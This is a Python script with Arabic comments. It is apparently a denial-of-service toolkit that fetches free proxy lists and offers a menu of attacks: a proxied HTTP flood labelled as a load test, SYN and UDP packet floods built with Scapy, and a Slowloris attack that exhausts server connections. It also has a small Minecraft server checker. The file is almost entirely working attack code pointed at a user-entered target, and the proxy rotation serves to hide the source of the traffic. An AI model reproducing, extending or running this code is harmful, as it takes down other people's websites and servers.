import asyncio
import aiohttp
import random
import time
import socket
import threading
import requests
from scapy.all import IP, TCP, UDP, send

# ---------- إعدادات ----------
LOG_FILE = "requests.log"
REPORT_INTERVAL = 1
# -----------------------------

# إحصائيات عامة
stats = {"sent":0, "success":0, "failed":0, "timeout":0}
proxies = []

# ---------- Logging ----------
def log_request(i, status, proxy, elapsed):
    with open(LOG_FILE, "a") as f:
        f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} | Req {i} | Status:{status} | Proxy:{proxy} | Time:{elapsed:.2f}\n")

# ---------- Proxy Collector ----------
def fetch_proxies():
    print("[+] Fetching proxies...")
    sources = [
        "https://www.proxy-list.download/api/v1/get?type=http",
        "https://www.proxy-list.download/api/v1/get?type=https",
        "https://www.proxy-list.download/api/v1/get?type=socks4",
        "https://www.proxy-list.download/api/v1/get?type=socks5"
    ]
    collected = set()
    for url in sources:
        try:
            r = requests.get(url, timeout=10)
            if r.status_code == 200:
                for line in r.text.splitlines():
                    if line.strip():
                        collected.add(line.strip())
        except:
            continue
    print(f"[+] Collected {len(collected)} proxies")
    return list(collected)

# ---------- Layer7 HTTP/HTTPS ----------
async def layer7_worker(session, url, i, timeout, max_retries):
    global stats
    proxy = random.choice(proxies) if proxies else None
    attempt = 0
    while attempt <= max_retries:
        try:
            start = time.time()
            async with session.get(url, proxy=proxy, timeout=timeout) as resp:
                elapsed = time.time() - start
                stats["sent"] += 1
                if resp.status == 200:
                    stats["success"] += 1
                else:
                    stats["failed"] += 1
                log_request(i, resp.status, proxy, elapsed)
                return
        except asyncio.TimeoutError:
            attempt += 1
            stats["timeout"] += 1
            stats["sent"] +=1
            log_request(i,"TIMEOUT",proxy,timeout)
        except Exception as e:
            attempt +=1
            stats["failed"] +=1
            stats["sent"] +=1
            log_request(i,"ERROR",proxy,0)
        await asyncio.sleep(0.1*attempt)

async def run_layer7(url, concurrency, timeout, max_retries):
    connector = aiohttp.TCPConnector(limit=0)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [layer7_worker(session,url,i,timeout,max_retries) for i in range(concurrency)]
        reporter_task = asyncio.create_task(layer7_reporter())
        await asyncio.gather(*tasks)
        reporter_task.cancel()

async def layer7_reporter():
    last_sent = 0
    try:
        while True:
            await asyncio.sleep(REPORT_INTERVAL)
            current_sent = stats["sent"]
            rps = (current_sent - last_sent)/REPORT_INTERVAL
            last_sent = current_sent
            print(f"[Layer7] Sent: {stats['sent']} | Success: {stats['success']} | Failed: {stats['failed']} | Timeout: {stats['timeout']} | RPS: {rps:.2f}")
    except asyncio.CancelledError:
        pass

# ---------- Layer4 TCP/UDP Flood ----------
def layer4_flood(target_ip, port, protocol, count):
    sent_count = 0
    ip = IP(dst=target_ip)
    if protocol.lower() == "tcp":
        tcp_pkt = TCP(dport=port, flags="S")
        for _ in range(count):
            send(ip/tcp_pkt, verbose=False)
            sent_count +=1
    elif protocol.lower() == "udp":
        udp_pkt = UDP(dport=port)
        for _ in range(count):
            send(ip/udp_pkt, verbose=False)
            sent_count +=1
    print(f"[Layer4] Sent {sent_count} {protocol.upper()} packets to {target_ip}:{port}")

# ---------- Layer4 Slow TCP (Slowloris) ----------
def slow_tcp(target_ip, port, connections=50, delay=5):
    print(f"[Layer4] Starting Slow TCP Attack on {target_ip}:{port}")
    sockets = []
    for _ in range(connections):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, port))
            s.send(b"GET / HTTP/1.1\r\n")
            sockets.append(s)
        except:
            continue
    try:
        while True:
            for s in sockets:
                try:
                    s.send(b"X-a: b\r\n")
                except:
                    sockets.remove(s)
            time.sleep(delay)
    except KeyboardInterrupt:
        print("[Layer4] Slow TCP stopped manually")

# ---------- Minecraft Tool ----------
def query_minecraft(server_ip, port=25565):
    # طريقة بسيطة لاستعلام عدد اللاعبين وحالة السيرفر باستخدام socket
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((server_ip, port))
        print(f"[Minecraft] Server {server_ip}:{port} is online")
        s.close()
    except:
        print(f"[Minecraft] Server {server_ip}:{port} is offline or unreachable")

def minecraft_console(server_ip, port=25565):
    # إرسال أوامر وهمية للمحاكاة (يمكن تطويرها أكثر باستخدام مكتبات RCON)
    print("[Minecraft] Type 'exit' to leave console")
    while True:
        cmd = input("MC> ")
        if cmd.lower() == "exit":
            break
        else:
            print(f"[Minecraft] Command '{cmd}' sent to server {server_ip}:{port} (simulated)")

# ---------- Main Menu ----------
def main():
    global proxies
    proxies = fetch_proxies()
    while True:
        print("""
        ===== Main Menu =====
        1. Layer7 HTTP/HTTPS Load Test
        2. Layer4 TCP/UDP Flood
        3. Layer4 Slow TCP (Slowloris)
        4. Minecraft Server Tool
        0. Exit
        """)
        choice = input("Choose option: ").strip()
        if choice=="1":
            url = input("Enter target URL: ").strip()
            concurrency = int(input("Enter number of threads: ").strip())
            timeout = float(input("Enter request timeout: ").strip())
            max_retries = int(input("Enter max retries: ").strip())
            asyncio.run(run_layer7(url, concurrency, timeout, max_retries))
        elif choice=="2":
            target = input("Enter target IP: ").strip()
            port = int(input("Enter port: ").strip())
            protocol = input("TCP or UDP: ").strip()
            count = int(input("Number of packets: ").strip())
            layer4_flood(target, port, protocol, count)
        elif choice=="3":
            target = input("Enter target IP: ").strip()
            port = int(input("Enter port: ").strip())
            connections = int(input("Number of connections: ").strip())
            delay = float(input("Delay between headers (seconds): ").strip())
            t = threading.Thread(target=slow_tcp,args=(target,port,connections,delay))
            t.start()
        elif choice=="4":
            server_ip = input("Enter Minecraft server IP: ").strip()
            port = input("Enter Minecraft port (default 25565): ").strip()
            port = int(port) if port else 25565
            query_minecraft(server_ip, port)
            minecraft_console(server_ip, port)
        elif choice=="0":
            exit()
        else:
            print("Invalid choice")

if __name__=="__main__":
    main()
